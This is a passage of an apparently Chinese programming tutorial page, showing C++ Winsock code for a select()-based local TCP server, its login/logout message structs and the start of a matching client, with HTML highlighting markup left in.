class="keyword">else</span> <span class="keyword">if</span> (selectRes == <span class="number">0</span>) &#123;  <span class="comment">// 超时，无活动</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;do something else&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  <span class="comment">// select 错误</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;select func error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此服务端完整代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Server.hpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Message.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Server</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">SOCKET servSock;</span><br><span class="line">std::list&lt;SOCKET&gt; clientList;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">coreFunc</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Server</span>() :<span class="built_in">servSock</span>(INVALID_SOCKET) &#123;&#125;;</span><br><span class="line">~<span class="built_in">Server</span>();</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">close</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* ip, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">recvMsg</span><span class="params">(fd_set&amp; fdRead, SOCKET&amp; clientSock)</span></span>;</span><br><span class="line"><span class="comment">//bool conductMsg();</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Server.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;server.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">Server::~<span class="built_in">Server</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Server::close</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (servSock != INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">closesocket</span>(servSock);</span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line"><span class="built_in">closesocket</span>(client);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* ip, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WSADATA data&#123;&#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;startup error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">servSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (servSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;socket error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">sockaddr_in servAddr&#123;&#125;;</span><br><span class="line"></span><br><span class="line">servAddr.sin_family = AF_INET;</span><br><span class="line">servAddr.sin_port = <span class="built_in">htons</span>(<span class="number">2345</span>);</span><br><span class="line"><span class="built_in">inet_pton</span>(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;servAddr.sin_addr.S_un.S_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">bind</span>(servSock, (sockaddr*)&amp;servAddr, <span class="built_in">sizeof</span>(sockaddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;bind error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">listen</span>(servSock, <span class="number">128</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;listen error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">coreFunc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::coreFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">assert</span>(servSock != INVALID_SOCKET);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">fd_set fdRead;</span><br><span class="line"><span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line"><span class="built_in">FD_SET</span>(servSock, &amp;fdRead);</span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">FD_SET</span>(client, &amp;fdRead);</span><br><span class="line">&#125;</span><br><span class="line">timeval tv&#123; <span class="number">1</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);</span><br><span class="line"><span class="keyword">if</span> (selectRes &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; fdRead.fd_count; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fdRead.fd_array[i] == servSock)</span><br><span class="line">&#123;</span><br><span class="line">SOCKET clntSock = <span class="built_in">accept</span>(servSock, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">if</span> (clntSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;accept error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">clientList.<span class="built_in">push_back</span>(clntSock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">recvMsg</span>(fdRead, fdRead.fd_array[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (selectRes == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;do something else&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;select func error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::recvMsg</span><span class="params">(fd_set&amp; fdRead, SOCKET&amp; clientSock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Header header;</span><br><span class="line"><span class="type">int</span> recvRes = <span class="built_in">recv</span>(clientSock, (<span class="type">char</span>*)&amp;header, <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Client disconnected:&quot;</span> &lt;&lt; clientSock &lt;&lt; std::endl;</span><br><span class="line">clientList.<span class="built_in">erase</span>(std::<span class="built_in">remove</span>(clientList.<span class="built_in">begin</span>(), clientList.<span class="built_in">end</span>(), clientSock), clientList.<span class="built_in">end</span>());</span><br><span class="line"><span class="built_in">closesocket</span>(clientSock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (header.cmd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGIN:</span><br><span class="line">&#123;</span><br><span class="line">Login login;</span><br><span class="line"><span class="type">int</span> recvRes2 = <span class="built_in">recv</span>(clientSock, (<span class="type">char</span>*)&amp;login + <span class="built_in">sizeof</span>(Header),</span><br><span class="line"><span class="built_in">sizeof</span>(Login) - <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes2 &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LoginResult <span class="title">loginResult</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(clientSock, (<span class="type">char</span>*)&amp;loginResult, <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGOUT:</span><br><span class="line">&#123;</span><br><span class="line">Logout logout;</span><br><span class="line"><span class="type">int</span> recvRes2 = <span class="built_in">recv</span>(clientSock, (<span class="type">char</span>*)&amp;logout + <span class="built_in">sizeof</span>(Header),</span><br><span class="line"><span class="built_in">sizeof</span>(Logout) - <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes2 &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LogoutResult <span class="title">logoutResult</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(clientSock, (<span class="type">char</span>*)&amp;logoutResult, <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGIN_RESULT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGOUT_RESULT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//bool Server::conductMsg() &#123;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Server server;</span><br><span class="line"><span class="keyword">if</span> (!server.<span class="built_in">init</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">2345</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">server.<span class="built_in">start</span>();</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//message.hpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">CMD</span></span><br><span class="line">&#123;</span><br><span class="line">LOGIN,</span><br><span class="line">LOGOUT,</span><br><span class="line">LOGIN_RESULT,</span><br><span class="line">LOGOUT_RESULT,</span><br><span class="line">NO_CMD</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Header</span></span><br><span class="line">&#123;</span><br><span class="line">CMD cmd;</span><br><span class="line"><span class="type">unsigned</span> dataLength;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Header</span>() : <span class="built_in">cmd</span>(CMD::NO_CMD)</span><br><span class="line">, <span class="built_in">dataLength</span>(<span class="number">0</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Header</span>(CMD cmd_, <span class="type">unsigned</span> dataLength_) : <span class="built_in">cmd</span>(cmd_)</span><br><span class="line">, <span class="built_in">dataLength</span>(dataLength_) &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Login</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> usrName[<span class="number">32</span>];</span><br><span class="line"><span class="type">char</span> passwd[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">Login</span>(<span class="type">const</span> <span class="type">char</span>* userName_, <span class="type">const</span> <span class="type">char</span>* passwd_) :<span class="built_in">Header</span>(CMD::LOGIN, <span class="built_in">sizeof</span>(Login))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy_s</span>(usrName, <span class="number">32</span>, userName_);</span><br><span class="line"><span class="built_in">strcpy_s</span>(passwd, <span class="number">32</span>, passwd_);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Login</span>() :<span class="built_in">Header</span>(CMD::LOGIN, <span class="built_in">sizeof</span>(Login)), usrName&#123; <span class="number">0</span> &#125;, passwd&#123; <span class="number">0</span> &#125; &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Logout</span> : <span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> logoutNum;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Logout</span>(<span class="type">unsigned</span> logoutNum_) : <span class="built_in">Header</span>(CMD::LOGOUT, <span class="built_in">sizeof</span>(Logout))</span><br><span class="line">, <span class="built_in">logoutNum</span>(logoutNum_) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Logout</span>() :<span class="built_in">Header</span>(CMD::LOGOUT, <span class="built_in">sizeof</span>(Logout)), <span class="built_in">logoutNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LoginResult</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> loginResultNum;</span><br><span class="line"><span class="built_in">LoginResult</span>(<span class="type">unsigned</span> loginResultNum_) :<span class="built_in">Header</span>(CMD::LOGIN_RESULT, <span class="built_in">sizeof</span>(LoginResult)), <span class="built_in">loginResultNum</span>(loginResultNum_) &#123;&#125;</span><br><span class="line"><span class="built_in">LoginResult</span>() :<span class="built_in">Header</span>(CMD::LOGIN_RESULT, <span class="built_in">sizeof</span>(LoginResult)), <span class="built_in">loginResultNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LogoutResult</span> :<span class="keyword">public</span> Header</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> logoutResultNum;</span><br><span class="line"><span class="built_in">LogoutResult</span>(<span class="type">unsigned</span> logoutResultNum_) :<span class="built_in">Header</span>(CMD::LOGOUT_RESULT, <span class="built_in">sizeof</span>(LogoutResult)), <span class="built_in">logoutResultNum</span>(logoutResultNum_) &#123;&#125;</span><br><span class="line"><span class="built_in">LogoutResult</span>() :<span class="built_in">Header</span>(CMD::LOGOUT_RESULT, <span class="built_in">sizeof</span>(LogoutResult)), <span class="built_in">logoutResultNum</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Message.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WSADATA data&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;WSAstartup error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">SOCKET servSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (servSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;socket error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">sockaddr_in servAddr&#123;&#125;;</span><br><span class="line">servAddr.sin_family = AF_INET;</span><br><span class="line">servAddr.sin_port = <span class="built_in">htons</span>(<span class="number">2345</span>);</span><br><span class="line"><span class="built_in">inet_pton</span>(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;servAddr.sin_addr.S_un.S_addr);</span><br><span class="line"><span class="keyword">if</span> (<span 